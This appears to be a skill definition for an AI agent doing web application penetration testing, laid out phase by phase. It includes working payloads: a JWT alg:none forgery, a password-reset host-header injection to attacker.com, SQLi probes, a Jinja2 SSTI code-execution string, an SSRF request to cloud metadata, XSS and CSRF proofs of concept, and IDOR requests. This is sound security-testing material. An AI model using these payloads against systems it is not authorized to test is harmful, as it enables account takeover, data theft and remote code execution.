---
name: sec-dast
description: >
  Web application dynamic security testing skill. Active testing for
  authentication flaws, authorization bypass, injection, session management
  issues, business logic flaws, and security misconfigurations. Goes beyond
  APIs — covers full web app surface. Trigger on /sec dast, or when user
  shares a web app URL and asks test this app, find vulnerabilities, web app
  pentest, OWASP Top 10 test, security test my app, check auth, test for
  XSS SQLi CSRF.
---

# sec-dast — Web Application Dynamic Security Testing

Active testing. Real findings. Working PoCs. Not a scanner report rehash.

**Scope rule:** Confirm authorization before any active testing.

---

## Testing Priority Order

1. **Authentication and Session** — account takeover is always critical
2. **Authorization / Access Control** — horizontal + vertical privilege escalation
3. **Injection** — SQLi, SSTI, Command injection, SSRF
4. **Client-Side** — XSS, CSRF, clickjacking, DOM attacks
5. **Business Logic** — workflow bypass, price manipulation, rate limiting
6. **Security Headers** — quick wins, low-hanging

---

## Phase 1: Reconnaissance

Fingerprint the stack:
```bash
curl -s -I https://target.com | grep -E "(Server:|X-Powered-By:|Set-Cookie:|Content-Security-Policy:)"
whatweb https://target.com
```

Map high-value pages: login, register, password reset, MFA flows,
admin panels, file upload, payment/checkout, user profile, search,
redirect parameters (?next=, ?url=, ?redirect=).

Auth mechanism identification:
| Type | Detection | Attack Focus |
|------|-----------|-------------|
| Session cookie | Set-Cookie: session=... | Fixation, theft, weak entropy |
| JWT | eyJ... in Authorization | Alg:none, weak secret, kid injection |
| API key | X-API-Key: header | Exposure, no rotation |
| OAuth/OIDC | Authorization: Bearer | Redirect URI bypass, state fixation |
| Basic Auth | Authorization: Basic | Credential brute force |

---

## Phase 2: Authentication Testing

### Login Endpoint
```bash
# Username enumeration via timing
curl -s -o /dev/null -w "%{time_total}" \
  -X POST https://target.com/login \
  -d "username=valid@user.com&password=wrong"
# Compare timing with nonexistent user — diff > 100ms = enumeration
```

Login checks:
- [ ] Username enumeration via different errors or response times
- [ ] No account lockout after N failed attempts
- [ ] No CAPTCHA or rate limiting on login
- [ ] Login over HTTP (not HTTPS)

### Password Reset
```bash
# Host header injection — attacker receives victim's reset link
curl -X POST https://target.com/reset-password \
  -H "Host: attacker.com" \
  -d "email=victim@target.com"
```

Reset checks:
- [ ] Token guessable (short, timestamp-based, sequential)?
- [ ] Can reset token be reused after first use?
- [ ] Does token expire?
- [ ] Host header injection in reset email?

### JWT Testing
```python
import base64, json
token = "eyJ..."
header, payload, sig = token.split('.')
print(json.loads(base64.b64decode(payload + '==')))

# Test alg:none bypass
header_none = base64.b64encode(b'{"alg":"none","typ":"JWT"}').decode().rstrip('=')
payload_admin = base64.b64encode(b'{"role":"admin"}').decode().rstrip('=')
forged = f"{header_none}.{payload_admin}."
# Submit forged token — if accepted = critical auth bypass
```

## Phase 3: Authorization Testing

### Horizontal Privilege Escalation (IDOR)
```bash
# User A accesses their resource
curl -H "Authorization: Bearer <user_a_token>" \
  https://target.com/api/users/1001/profile

# Swap to User B's ID
curl -H "Authorization: Bearer <user_a_token>" \
  https://target.com/api/users/1002/profile
# If successful = IDOR — unauthorized data access
```

IDOR patterns to test: integer IDs (sequential), UUIDs from other users,
hashed IDs (check if MD5/SHA1 of int), encoded IDs (base64, URL encoding).

### Vertical Privilege Escalation
```bash
# Test admin endpoints with non-admin token
curl -H "Authorization: Bearer <regular_user_token>" \
  https://target.com/admin/users

# Mass assignment — add unexpected privileged fields
curl -X POST https://target.com/register \
  -d '{"username":"attacker","password":"pass","is_admin":true}'
```

---

## Phase 4: Injection Testing

### SQL Injection
```bash
curl "https://target.com/search?q=test'"   # Watch for SQL error or 500
curl "https://target.com/items?id=1 AND 1=1"  # Boolean true
curl "https://target.com/items?id=1 AND 1=2"  # Boolean false — diff response = SQLi
# sqlmap for confirmation: sqlmap -u "https://target.com/items?id=1" --batch
```

### SSTI Detection
```
{{7*7}}     → 49 (Jinja2/Twig)
${7*7}      → 49 (Freemarker/EL)
<%= 7*7 %>  → 49 (ERB/EJS)
#{7*7}      → 49 (Ruby ERB)
*{7*7}      → 49 (Spring EL)

# If 49 in response = SSTI → likely RCE
# Jinja2 RCE: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

### SSRF
```bash
curl -X POST https://target.com/api/fetch \
  -d '{"url": "http://169.254.169.254/latest/meta-data/"}'
# If AWS metadata returned = SSRF — CRITICAL

# DNS callback detection (use interactsh)
curl -X POST https://target.com/api/fetch \
  -d '{"url": "http://YOUR_INTERACTSH_ID.interactsh.com/"}'
```

---

## Phase 5: Client-Side Testing

### XSS
```
Test inputs: <script>alert(1)</script>
WAF bypasses: <img src=x onerror=alert(1)>
              <svg onload=alert(1)>
              javascript:alert(1) (in href params)
DOM XSS: https://target.com/#<img src=x onerror=alert(1)>
Stored targets: comments, profile fields, usernames, file names
```

### CSRF
```bash
# Check for CSRF token in state-changing POST requests
# If absent, test with cross-origin request:
cat > csrf-poc.html << 'EOF'
<form action="https://target.com/account/delete" method="POST">
  <input type="hidden" name="confirm" value="yes">
</form>
<script>document.forms[0].submit()</script>
EOF
```

---

## Phase 6: Security Headers

```bash
curl -s -I https://target.com | grep -iE "(content-security-policy|strict-transport-security|x-frame-options|x-content-type-options|referrer-policy)"
```

| Header | Required | Risk if Missing |
|--------|----------|----------------|
| Content-Security-Policy | Restrictive policy | XSS amplification |
| Strict-Transport-Security | max-age=31536000 | SSL stripping |
| X-Frame-Options | DENY or SAMEORIGIN | Clickjacking |
| X-Content-Type-Options | nosniff | MIME sniffing |

---

## Severity Ratings

| Finding | Severity |
|---------|----------|
| SQLi with data extraction | Critical |
| JWT auth bypass (alg:none) | Critical |
| SSRF to cloud metadata | Critical |
| RCE via SSTI | Critical |
| IDOR exposing all user data | Critical |
| Stored XSS on admin panel | High |
| Vertical privilege escalation | High |
| Password reset host injection | High |
| CSRF on account takeover action | High |
| Reflected XSS | Medium |
| Missing security headers | Low |

---

## Output

Write findings to `DAST-REPORT.md`. Terminal summary:
```
[sec-dast] Web Application Test Complete
Target:   https://target.com
Findings: XX (Critical: X | High: X | Medium: X | Low: X)
Full report: DAST-REPORT.md
```

## File Structure
```
sec-dast/
├── SKILL.md
├── references/
│   ├── owasp-top10-2021.md
│   ├── auth-test-cases.md
│   ├── injection-payloads.md
│   └── header-reference.md
└── scripts/
    ├── header_checker.py
    ├── jwt_tester.py
    └── idor_scanner.py
```
